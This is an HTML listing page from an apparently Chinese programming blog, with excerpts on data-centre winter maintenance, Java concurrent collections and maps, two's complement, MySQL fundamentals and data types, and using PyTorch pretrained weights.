		<a class="list__footer-readmore btn" href="/posts/008454d3f7eb747343cf01e20255a8f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9ce4f0822ae17d885df3ba54bafe799/" rel="bookmark">
			冬季数据中心运维要注意哪些问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在冬季，室内温度下降，设备易受冷空气的影响。因此，需要确保机房的恒温恒湿设备正常运行，保持适宜的温度和湿度，对精密空调运行参数根据环境变化和气温变化进行相应的调整，节约能耗的同时确保机房IT设备平稳运行。
然后是空调系统，需要重点关注室外设备，低温会冻结数据中心外部的设施，尤其是北方一些严寒地区，包括室外机、供回水管、阀门、冷却塔、蓄冷罐、水泵等，虽然做了相应的保温防护措施，但仍有出现故障的可能性。因此，我们需要重点监控这些设备的实际情况，以确保数据中心在冬季的正常运行。大多数数据中心冬季都会切换至自然冷源供冷，比如说板换，我们在使用自然冷却制冷方式的同时，也要关注我们的机械制冷，比如冷机，时刻确保他们的状态同样处于正常，一旦出现紧急情况可以随时切换，实现供冷不间断。
此外，严寒雨雪等天气对数据中心的供电也有一定影响，尤其是在冬季恶劣天气下，市电供电可靠性有所降低，市电中断修复时间也将远超过普通时段，运维风险陡然上升。因此，我们需要采取预防措施，入冬之前对不间断电源系统（UPS）进行全面检查和维护，对蓄电池进行排查，有故障电池及时更换；除此之外还应对柴油发电机进行重点维护，包括冷却液加热系统，供回油管路，尤其是室外供回油管路及油泵还应当有额外的防护措施，避免因冬季气温降低造成供回油中断。最后，与附近加油站确认供油协议，保证在极端情况下燃油的供应，确保供电可持续性。
除了技术上的保障，最为关键的还是要从人来入手。在冬天寒冷的环境下，运维团队需对数据中心进行一次全面的检查和维修。这包括对所有管道、通道和大型设备进行细致的检查，确认并提前排除隐患，确保它们在冬季可以正常运行。准备好各类标准文档，包括SOP\EOP\MOP等，做好适合冬季的应急预案。还要关注天气情况，恶劣天气时推迟或中止维护工作;根据气候条件的特殊性，针对性制定相应的巡检计划，包括室内设备和室外设备，确保远程监控面板正常打开，便于采取应对措施。
做好应急演练，在冬季到来之前，提前根据以往经验和实际情况，有针对性的对冬季数据中心运维中可能出现的紧急情况进行演练，包括设备故障、供电中断、供水中断、安全事件、消防应急等，尽可能模拟极端的故障和应急环境，确保人员有应急处理的能力。
最后，运维人员也要采取一定防寒措施，注意保暖，如厚外套，手套，棉帽等，然后咱们也要加强运维人员的安全防护意识，对其进行安全培训，避免因冬季运维造成人身安全事故，在室外进行维护作业时，穿戴好安全防护用具，注意因冬季结冰造成的地面湿滑，尤其是一些强降雪地区，积雪对运维造成了比较大的影响，我们在完成运维工作的同时首先应当保证人员的安全健康。
免责声明：文章来源网络及其他媒体平台，转载目的在于传递更多信息，仅代表作者个人观点，不确保文章的准确性，如有侵犯版权请告知，我们将在24小时内删除！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2dc9fe58f900f3ee31676adaae245364/" rel="bookmark">
			Java集合（八）BlockingQueue、ArrayBlockingQueue、LinkedBlockingQueue、PriorityBlockingQueue、DelayQueue
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 【BlockingQueue】一、Queue和BlockingQueue二、BlockingQueue接口中的方法三、ArrayBlockingQueue和LinkedBlockingQueue的比较* 【ArrayBlockingQueue】一、ArrayBlockingQueue介绍1.1 ArrayBlockingQueue特点*1.2 ArrayBlockingQueue的使用 二、从源码理解ArrayBlockingQueue2.1 创建对象2.2 添加元素2.3 删除元素2.4 获取元素2.5 清空队列 【LinkedBlockingQueue】一、LinkedBlockingQueue介绍1.1 LinkedBlockingQueue的特点*1.3 LinkedBlockingQueue的使用 二、从源码理解LinkedBlockingQueue2.1 节点2.2 构造方法2.3 添加元素2.4 删除元素2.5 查找元素 【PriorityBlockingQueue 】一、PriorityBlockingQueue介绍1.1 PriorityBlockingQueue的特点*1.2 PriorityBlockingQueue的使用 二、从源码理解PriorityBlockingQueue2.1 构造方法2.2 添加元素2.3 获取元素2.4 删除元素 【DelayQueue】一、DelayQueue介绍1.1 DelayQueue的特点*1.2 DelayQueue的使用 二、从源码理解DelayQueue2.1 Delayed接口2.2 成员变量2.3 构造方法2.4 入队2.5 出队2.6 获取元素 本系列文章：
Java集合（一）集合框架概述
Java集合（二）List、ArrayList、LinkedList
Java集合（三）CopyOnWriteArrayList、Vector、Stack
Java集合（四）Map、HashMap
Java集合（五）LinkedHashMap、TreeMap
Java集合（六）Hashtable、ConcurrentHashMap
Java集合（七）Set、HashSet、LinkedHashSet、TreeSet
Java集合（八）BlockingQueue、ArrayBlockingQueue、LinkedBlockingQueue、PriorityBlockingQueue、DelayQueue
【BlockingQueue】 一、Queue和BlockingQueue Queue，队列。Queue通常但不一定是以FIFO（先进先出）方式排序元素。
Queue通常不允许插入null元素。
Queue一般用作高并发集合容器。
BlockingQueue即阻塞队列，从阻塞这个词可以看出，在某些情况下对阻塞队列的访问可能会造成阻塞。被阻塞的情况主要有如下两种：
当一个线程试图对一个已经满了的队列进行入队列操作时，它将会被阻塞，除非有另一个线程做了出队列操作；当一个线程试图对一个空队列进行出队列操作时，它将会被阻塞，除非有另一个线程进行了入队列操作。 BlockingQueue的接口位于JUC包中，表明了BlockingQueue是线程安全的。
阻塞队列被广泛使用在“生产者-消费者”问题中，其原因是BlockingQueue提供了可阻塞的插入和移除的方法。当队列容器已满，生产者线程会被阻塞，直到队列未满；当队列容器为空时，消费者线程会被阻塞，直至队列非空时为止。
BlockingQueue提供了线程安全的队列访问方式：当阻塞队列进行插入数据时，如果队列已满，线程将会阻塞等待直到队列非满；从阻塞队列取数据时，如果队列已空，线程将会阻塞等待直到队列非空。并发包下很多高级同步类的实现都是基于BlockingQueue实现的。BlockingQueue适合用于作为数据共享的通道。
使用阻塞算法的队列可以用一个锁（入队和出队用同一把锁）或两个锁（入队和出队用不同的锁）等方式来实现。
阻塞队列和一般的队列的区别就在于：
多线程支持，多个线程可以安全的访问队列。阻塞操作，当队列为空的时候，消费线程会阻塞等待队列不为空；当队列满了的时候，生产线程就会阻塞直到队列不满。 生产者消费者模式
生产者消费者模式会经常使用阻塞队列来实现：
负责生产的线程不断的制造新对象并插入到阻塞队列中，直到达到这个队列的上限值。队列达到上限值之后生产线程将会被阻塞，直到消费的线程对这个队列进行消费。同理，负责消费的线程不断的从队列中消费对象，直到这个队列为空，当队列为空时，消费线程将会被阻塞，除非队列中有新的对象被插入。 阻塞队列有：
ArrayBlockingQueue ：由数组结构组成的有界阻塞队列。LinkedBlockingQueue ：由链表结构组成的有界阻塞队列。PriorityBlockingQueue ：支持优先级排序的无界阻塞队列。DelayQueue：使用优先级队列实现的无界阻塞队列。SynchronousQueue：不存储元素的阻塞队列。LinkedTransferQueue：由链表结构组成的无界阻塞队列。LinkedBlockingDeque：由链表结构组成的双向阻塞队列。 二、BlockingQueue接口中的方法 阻塞队列一共有四套方法分别用来进行insert、remove，当每套方法对应的操作不能马上执行时会有不同的结果：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2dc9fe58f900f3ee31676adaae245364/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/847901bf1a8ab82d64a8ec373fc4f30b/" rel="bookmark">
			计算机基础知识讲解（原码反码补码）（以及在C语言里面是如何计算和运用的）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		补码反码掩码以及原理 补码、反码和掩码是计算机科学中用于表示和处理数值的三种编码方式。
原码 原码是最直观的数值表示方法，它将数值的二进制表示与其符号位结合起来。在原码表示中，正数的符号位为0，而负数的符号位为1。原码的缺点在于它无法直接表示负数，因为在计算负数的时候需要进行特殊的处理。
反码 反码用于简化负数的运算。对于正数，其反码与原码相同；对于负数，反码是将原码除符号位外的所有位取反（0变1，1变0）。反码解决了原码在进行加减运算时需要额外的符号位转换的问题，但它仍然存在正负零的区分问题。
补码 补码是目前计算机中最常用的数值表示方法。对于正数，补码与原码相同；对于负数，补码是在反码的基础上加1。补码的优点在于它将符号位的概念和数值的表示统一起来，并且使得加法和减法运算统一化，简化了计算机内部的逻辑电路设计。
下面顺便提一嘴掩码，不过多赘述。
掩码 掩码通常用于位操作中，它是一个用于遮掩或选择特定位数的二进制数。在计算机编程中，掩码常用于位运算，比如设置或清除特定的位。通过掩码，可以很方便地控制数值的某几位是否参与运算或被设置为特定的值。
例如，如果要设置一个整数的第3位到第5位，可以构造一个掩码，其中只有这些位是1，其余位是0。然后将这个掩码与整数进行按位与操作，就能达到设置这些位的目的。
综上所述，补码、反码和掩码都是计算机中数值表示和处理的重要工具，它们各有特点和应用场景。补码广泛应用于计算机中的数值计算，反码在某些特定的数学运算中有所应用，而掩码则主要用于位操作和特定位的控制。
————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
C语言代码实例代码解释原码反码补码 解释：计算机里面进行数值的计算往往是补码进行计算，也就是在计算机里面进行计算是32位，如果数值是正整数的情况下32位的初始位从左到右的第一个位是0也就是符号位，如果是负数的情况下，从左到右初始位也就是符号位是1。
————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
画图实例： 计算机是如何计算的 在计算机计算数值里面，计算机会把数值计算成
这里我们拿代码进行举例
这里是正数的数值 正数的数值原码反码补码的数值是一样的
这里的数值是10来进行举例
这里需要知道的是，计算机进行计算转换的时候是把十进制的数值转换成二进制，然后把二进制计算成补码然后进行计算。
正数的计算是原码反码补码是一样的。
负数的原码反码不一样是有计算过程的
是在原码的基础上 取反+1
如图
这里我们需要知道，计算的时候数值是由32位的比特位组成，从右边向左边进行加减，也就是正常的加减乘除。如果是类型不一样的情况下，则会进行截断，也就是丢失数据，下面会进行讲解。
计算机运用符号，按位与或者按位或计算期间是利用补码进行计算
计算完毕之后返回原路 也就是之前是取反+1
补码计算完成之后需要 补码取反+1 变成原码 呈现给你看
需要知道 32位 最前面的是符号位 0是正数 1是负数
——————————————————————————————————————————————————————————————————————————————————————
下面我们举两个例子 拿这个来举例
举例1： 代码解释 所以-1是最特殊的 32位1 下面会剖析为什么是32位 举例2： ————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————————
计算里面为什么是32位 32位环境 通常指的是一个计算机系统或操作系统的架构，其中处理器、内存地址以及其他硬件和软件资源都使用32位二进制数来表示。这意味着该系统可以处理的数据量最大为2的32次方（即4,294,967,296）个不同的值。
在32位环境中，
处理器的寄存器、内存寻址以及其他硬件参数都是32位的。这影响了系统的地址空间大小、可以处理的数据量以及可以同时运行的程序的大小。例如，32位系统上的内存地址空间最大为4GB（2的32次方字节），尽管实际上由于各种系统开销，可用内存可能少于这个量。
32位环境也可以指编译器或编程语言的执行环境，例如，某些编译器或编程语言可以在32位操作系统上运行，或者专门为32位处理器优化。
在操作系统方面 32位操作系统是指系统核心以及运行在系统上的应用程序都是为32位硬件环境设计的。这包括Windows XP、Windows 7等，它们都可以在32位处理器上运行。
在编程语言和工具方面，32位环境可能涉及到汇编语言、C语言、C++等编程语言，以及相关的开发工具和库，它们都是针对32位处理器架构的。
这里涉及到一些指针的知识简单的理解就是
首先，必须理解，计算机内是有很多的硬件单元，而硬件单元是要互相协同工作的。所谓的协同，至少相互之间要能够进行数据传递
但是硬件与硬件之间是互相独立的，那么如何通信呢?答案很简单，用"线”连起来
而CPU和内存之间也是有大量的数据交互的，所以，两者必须也用线连起来
不过，我们今天关心一组线，叫做地址总线
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/847901bf1a8ab82d64a8ec373fc4f30b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/284212685a9b105e2e61fcf9e5fce9b2/" rel="bookmark">
			MySQL十部曲之一：MySQL概述及手册说明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 文章目录 数据库、数据库管理系统以及SQL之间的关系关系型数据库与非关系型数据库手册语法约定 数据库、数据库管理系统以及SQL之间的关系 名称说明数据库（Database）即存储数据的仓库，其本质是一个文件系统。它保存了一系列有组织的数据。数据库管理系统（Database Management System）是一种操纵和管理数据库的大型软件，用于建立、使用和维护数据库，对数据库进行统一管理和控制。用户通过数据库管理系统访问数据库中表内的数据。结构化查询语言（Structured Query Language）专门用来与数据库通信的语言。 数据库管理系统可以管理多个数据库，一般开发人员会针对每一个应用创建一个数据库。为保存应用中实体的数据，一般会在数据库创建多个表，以保存程序中实体用户的数据。数据库管理系统、数据库和表的关系如图所示：
关系型数据库与非关系型数据库 关系型数据库模型是把复杂的数据结构归结为简单的二元关系 （即二维表格式），它以行和列的形式存储数据，这一系列的行和列被称为表，一组表组成了一个库。表与表之间的数据记录存在关系。现实世界中的各种实体以及实体之间的各种联系均用关系模型来表示。因此关系型数据库，就是建立在关系模型基础上的数据库。SQL 就是关系型数据库的查询语言。非关系型数据库，可看成关系型数据库的阉割版本，它基于键值对存储数据，不需要经过SQL层的解析。NoSQL 一词泛指非关系型数据库，常用的非关系型数据库如下：
类型说明代表键值型数据库键值型数据库通过 Key-Value 键值的方式来存储数据，优点是查找速度快，缺点是无法像关系型数据库一样使用条件过滤。键值型数据库典型的使用场景是作为 内存缓存Redis文档型数据库文档型数据库可存放并获取文档，在数据库中文档作为处理信息的基本单位，一个文档就相当于一条记录。MongoDB搜索引擎数据库虽然关系型数据库采用了索引提升检索效率，但是针对全文索引效率却较低。搜索引擎数据库是应用在搜索引擎领域的数据存储形式，由于搜索引擎会爬取大量的数据，并以特定的格式进行存储，这样在检索的时候才能保证性能最优。Elasticsearch图形数据库图形数据库是一种存储图形关系的数据库。它利用了图这种数据结构存储了实体之间的关系。关系型数据用于存储明确关系的数据，但对于复杂关系的数据存储却有些力不从心。Neo4J 手册语法约定 方括号[]表示可选词或语句，例如，在下面的语句中，IF EXISTS是可选的：
DROP DTABLE [IF EXISTS] tab1_name 当一个语法元素由多个备选项组成时，这些备选项由竖条|分隔。当可以从一组选项中选择一个成员时，备选项列在方括号内：
TRIM([[BOTH | LEADING | TRAILING] [remstr] FROM] str) 当必须从一组选项中选择一个成员时，备选项在大括号{}中列出：
{DESCRIBE | DESC} tbl_name [col_name | wild] 省略号…表示省略语句的某一部分，通常是为了提供更复杂语法的更短版本。例如，SELECT…INTO OUTFILE是SELECT语句形式的简写。省略号还可以表示语句的前一个语法元素可以重复。在下面的示例中，可以给出多个reset_option值，每个值在第一个值之后以逗号开头：
RESET reset_option [,reset_option] ... 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1781f9ec403aefd6bf5cdcf5d211fbd3/" rel="bookmark">
			【Pytorch 第三讲】如何使用pre-trained weights 来训练自己的模型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# 理由#
有时在训练自己的模型时，如果从头开始训练自己的模型， 不但费时费力， 有时可能训练了很久， 好不容易收敛， 发现结果不是太好。 如果能够基于被人 已经训练好的权重， 初始化自己的模型。那么在训练自己的模型时会事半功倍。
一. Check Pre-trained Weights import torch from icecream import ic ckpt=torch.load("/home/ggl/full_skip.pth") ic(ckpt.keys()) Output: ic| ckpt.keys(): odict_keys(['patch_embed.conv_down.0.weight', 'patch_embed.conv_down.1.weight', ..........................................
import torch from icecream import ic tar_ckpt=torch.load("/home/ggl/Downloads/224_1k.pth.tar") ic(tar_ckpt.keys()) Output: ic| tar_ckpt.keys(): dict_keys(['epoch', 'arch', 'state_dict', 'optimizer', 'version', 'args', 'amp_scaler', 'metric'])
根据上面的输出，可以看到， 保存的权重中的键值对是不一样的。
第一个，保存的直接是 ‘state_dict"
第二个，保存的信息更加全面。 tar_ckpt["state_dict"] ,相当于第一个。
--------------------------------------------------- 补充信息 -------------------------------------------------------
补充信息：
dict 和 OrderedDict（odict）都是 Python 中的字典数据结构，但它们在维护元素顺序上有所不同。
1. dict（字典）:
示例：
my_dict = {'a': 1, 'b': 2, 'c': 3} for key, value in my_dict.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1781f9ec403aefd6bf5cdcf5d211fbd3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9cae59e23fad935f13cae8e0fa46758/" rel="bookmark">
			免费大礼包！神经网络方面论文合集共178篇！你还不来收藏？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		会议之眼 快讯
相信很多科研学者都很了解，人工神经网络（Artificial Neural Network，缩写ANN），简称神经网络（Neural Network，缩写NN），是一种模仿生物神经网络(动物的中枢神经系统，特别是大脑)的结构和功能的数学模型或计算模型，用于对函数进行估计或近似。是一种仿照人脑的“机器学习”算法。它是一种可以从大量示例分析和学习的计算机算法，具有自适应性，可大规模搜索。神经网络的算法就像人类的记忆技能，可以自行学习数据并扩展知识，从而解决一些非常困难的问题，因此也被称为“深度学习”算法。神经网络广泛地应用于分类预测、图像识别等领域。今天，小编为大家带来重磅福利！神经网络方面论文178篇！对于正在准备撰写相关方向论文的同学们来说，这个论文合集将是一份宝贵的参考资料，能够帮助你们在论文投稿最后冲刺阶段更加得心应手。这份合集也是一个难得的资源，各大顶会投稿主题都包含神经网络方向，如AAAI、ICML、CVPR、NIPS等等！这份资料可以为你们准备顶级会议论文提供借鉴和启发。小编衷心祝愿大家在学术研究的道路上取得更多的成功！赶紧收藏参考！快来码住！
神经网络的原理
神经网络以其多层神经元结构的网络层叠加，通过学习和预测从大量输入数据中提取特征。这种神经元结构在建立连接的基础上能够识别复杂的模式，并整合输入到输出之间的映射关系。在学习过程中，神经网络根据示例数据调整参数，并在训练完成后使用测试集进行评估，以衡量其精度和性能，从而满足人工智能系统的需求。
神经网络作为当今人工智能技术中最常见的模式，在工程学和商业领域引发了各种科学革命。它在不同行业和应用中发挥着越来越重要的作用。
神经网络的应用场景
神经网络作为一种强大的机器学习技术，已经在许多实际应用场景中得到广泛应用。以下是一些具体的神经网络实际应用场景：
图像分类和目标检测：神经网络在计算机视觉领域的图像分类和目标检测任务中表现出色。例如，可以使用卷积神经网络（CNN）对图像进行分类，实现自动驾驶中的交通标志识别或图像检索系统中的图像分类。
语音识别和语音合成：神经网络在语音识别和语音合成领域也取得了重大突破。它们被用于开发智能助理、语音控制系统以及自动语音转写等应用。
自然语言处理：神经网络在自然语言处理任务中也有广泛的应用，如文本分类、情感分析、机器翻译和问答系统。通过使用递归神经网络（RNN）或变换器（Transformer）等模型，可以处理语言数据并提供语义理解和生成能力。
推荐系统：神经网络在推荐系统中发挥着关键作用，通过学习用户的兴趣和行为模式，为用户提供个性化的推荐。这种个性化推荐可以在电子商务、音乐和视频流媒体服务等领域中提高用户满意度。
医疗诊断和预测：神经网络在医学图像分析、疾病预测和辅助诊断方面也有广泛应用。例如，使用卷积神经网络来分析医学影像，帮助医生进行早期癌症检测或辅助疾病诊断。
金融预测和交易：神经网络在金融领域中的应用包括股票价格预测、风险评估和高频交易等。通过分析历史数据和市场趋势，神经网络可以提供对金融市场的预测和决策支持。
游戏和虚拟现实：神经网络在游戏领域中有多种应用，如游戏智能代理、游戏生成和虚拟现实体验。它们被用于开发智能对手、游戏场景生成和角色行为建模等。
这只是神经网络在实际应用中的一小部分例子。随着技术的不断进步和创新，神经网络将继续在更多领域中发挥作用，为我们的生活带来更多便利和创新！
178篇论文合集
贴心的会议之眼已经为大家整理一些神经网络相关的经典论文合集！这个合集涵盖了神经网络在各个领域的应用，包括图像处理、自然语言处理、数据挖掘、模式识别等等。论文包含卷积神经网络、生成对抗网络、循环神经网络、图神经网络、Transforme等内容。对于想要深入研究神经网络技术的同学们来说，绝对是一份极具价值的资料库！
178篇论文资源现已上传到百度网盘，并整理成表，快码住收藏吧！
如何获取论文？
在微信公众号对话框中回复
“神经网络 2024”
即可获得~
PS: 后续更多学习资料免费分享！
敬请期待~
也可以添加会议之眼小助手微信领取哦～速速围观！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a64f4bdebdb3ba0bcc15a8a11a553076/" rel="bookmark">
			MySQL十部曲之四：MySQL中的数据类型
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言概述数字类型数字类型语法数字类型字面量十六进制字面量位字面量布尔字面量 数字类型的属性超出范围和溢出处理 时间和日期类型时间和日期类型语法DATE、DATETIME和TIMESTAMP的异同TIMESTAMP和DATETIME的自动初始化和更新时间和日期字面量 字符串类型字符串类型语法CHAR和VARCHAR的异同BINARY和VARBINARY的异同BLOB和TEXT的异同ENUMSET字符串字面量 JSON数据类型空间数据类型数据类型的默认值MySQL 8.0.13的显式默认值处理MySQL 8.0.13之前的显式默认处理隐式默认值处理 NULL 前言 本文翻译自官方文档。
概述 MySQL支持以下几种SQL数据类型：
数字类型日期和时间类型字符串（字符和字节）类型空间类型JSON数据类型 本章提供了对每个类别中类型的属性的概述和更详细的描述，数据类型描述使用以下约定：
对于整数类型，M表示最大显示宽度。对于浮点型和定点型，M是可以存储的总位数。对于字符串类型，M是最大长度。M的最大允许值取决于数据类型。D适用于浮点和定点类型，表示小数点后的位数。最大值为30，但不大于M−2。fsp适用于TIME、DATETIME和TIMESTAMP类型，表示小数秒精度，即秒的小数部分的小数点后面的位数。如果给定fsp值，则必须在0到6的范围内。值为0表示没有小数部分。如果省略，默认精度为0。方括号表示类型定义的可选部分。 数字类型 MySQL支持所有标准的SQL数字数据类型。这些类型包括精确数字数据类型（INTEGER、SMALLINT、DECIMAL和NUMERIC），以及近似数字数据类型（FLOAT、REAL和DOUBLE PRECISION）。关键字INT是INTEGER的同义词，关键字DEC和FIXED是DECIMAL的同义词。MySQL将DOUBLE视为DOUBLE PRECISION（一个非标准扩展）的同义词。MySQL也将REAL视为DOUBLE PRECISION的同义词，除非启用了REAL_AS_FLOAT SQL模式。BIT数据类型存储位值，支持MyISAM、MEMORY、InnoDB和NDB表。
数字类型语法 对于整数数据类型，M表示最小显示宽度。最大显示宽度为255。显示宽度与类型可以存储的值范围无关。对于浮点和定点数据类型，M是可以存储的总位数。整数数据类型允许UNSIGNED属性和SIGNED属性，其中SIGNED属性是默认的。
BIT[(M)]用于存储位值。M表示每个值的位数，取值范围为1 ~ 64。如果省略M，则默认为1。TINYINT[(M)] [UNSIGNED]：一个非常小的整数。取值范围为-128 ~ 127。无符号范围是0到255。BOOL, BOOLEAN：这些类型是TINYINT(1)的同义词。值为零被认为是false。非零值被认为是true： mysql&gt; SELECT IF(0, 'true', 'false'); +------------------------+ | IF(0, 'true', 'false') | +------------------------+ | false | +------------------------+ mysql&gt; SELECT IF(1, 'true', 'false'); +------------------------+ | IF(1, 'true', 'false') | +------------------------+ | true | +------------------------+ mysql&gt; SELECT IF(2, 'true', 'false'); +------------------------+ | IF(2, 'true', 'false') | +------------------------+ | true | +------------------------+ 然而，值TRUE和FALSE分别只是1和0的别名，如下所示：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a64f4bdebdb3ba0bcc15a8a11a553076/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/776029c5d7d2773438f1c322b2fa29ef/" rel="bookmark">
			Java集合（五）LinkedHashMap、TreeMap
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 【LinkedHashMap】一、LinkedHashMap介绍1.1 LinkedHashMap特点*1.2 LinkedHashMap的使用 二、从源码理解LinkedHashMap2.1 Entry*2.2 创建LinkedHashMap对象2.3 是否包含某个value2.4 获取元素2.5 清空LinkedHashMap2.6 遍历2.7 添加元素2.8 删除元素 【TreeMap】一、TreeMap介绍1.2 TreeMap的特点*1.2TreeMap的使用 二、从源码理解TreeMap2.1 Entry2.2 创建TreeMap对象2.3 查询数据2.4 添加数据2.5 删除数据 Java集合（一）集合框架概述
Java集合（二）List、ArrayList、LinkedList
Java集合（三）CopyOnWriteArrayList、Vector、Stack
Java集合（四）Map、HashMap
Java集合（五）LinkedHashMap、TreeMap
Java集合（六）Hashtable、ConcurrentHashMap
Java集合（七）Set、HashSet、LinkedHashSet、TreeSet
Java集合（八）BlockingQueue、ArrayBlockingQueue、LinkedBlockingQueue、PriorityBlockingQueue、DelayQueue
【LinkedHashMap】 一、LinkedHashMap介绍 LinkedHashMap是有序版本的HashMap。LinkedHashMap是HashMap的子类，所以LinkedHashMap自然会拥有HashMap的所有特性。同时，HashMap是无序的，即迭代HashMap所得到的元素顺序并不是它们最初添加到HashMap的顺序。而LinkedHashMap可以保证迭代元素的顺序与存入容器的顺序一致。
本质上，HashMap和双向链表合二为一就是LinkedHashMap。更准确地说，它是一个将所有Entry节点链入一个双向链表双向链表的HashMap。
一般来说，如果需要使用的Map中的key无序，选择HashMap；如果要求key有序，则选择TreeMap。但是选择TreeMap会有性能问题，因为TreeMap的get操作的时间复杂度是O(log(n))的，相比于HashMap的O(1)还是差不少的，LinkedHashMap的出现就是为了平衡这些因素，使得能够以 O(1)时间复杂度增加查找元素，又能够保证key的有序性。
在HashMap有一些空方法，比如：
void afterNodeAccess(Node&lt;K,V&gt; p) { } void afterNodeInsertion(boolean evict) { } void afterNodeRemoval(Node&lt;K,V&gt; p) { } LinkedHashMap重写了这些方法，用来保持列表的有序。
关于LinkedHashMap和HashMap结构上的差异，如下图所示。
HashMap的结构
LinkedHashMap的结构
LinkedHashMap的底层实现：将所有Entry节点链入一个双向链表的HashMap。在LinkedHashMap中，所有put进来的Entry都保存在哈希表中，但由于它又额外定义了一个以head为头结点的双向链表，因此对于每次put进来Entry，除了将其保存到哈希表上外，还会将其插入到双向链表的尾部。 1.1 LinkedHashMap特点* 1、由于继承HashMap类，所以默认初始容量是16，加载因子是0.75。2、线程不安全。3、具有fail-fast的特征。4、底层使用双向链表，可以保存元素的插入顺序，顺序有两种方式：一种是按照插入顺序排序，一种按照访问顺序做排序(可以做LRU策略的实现类)。默认以插入顺序排序。5、key和value允许为null，key重复时，新value覆盖旧value，即：最多只允许一条Entry的键为null。6、可以用来实现LRU算法。7、LinkedHashMap与HashMap的存取数据操作基本是一致的，只是增加了双向链表保证数据的有序性。8、LinkedHashMap继承HashMap，基于HashMap+双向链表实现。（HashMap是数组+链表+红黑树实现的）。 1.2 LinkedHashMap的使用 由于LinkedHashMap继承自HashMap，所以HashMap有的方法LinkedHashMap也有，特殊的在于LinkedHashMap中有序性的选择。
因为LinkedHashMap元素的有序性可分为插入顺序性和访问顺序性，所以可以在创建对象时，指定选择哪种顺序。accessOrder为false时，基于插入顺序；accessOrder为true时，基于访问顺序。
public LinkedHashMap(int initialCapacity, float loadFactor, boolean accessOrder) 二、从源码理解LinkedHashMap 2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/776029c5d7d2773438f1c322b2fa29ef/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/2/">«</a>
	<span class="pagination__item pagination__item--current">3/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/4/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>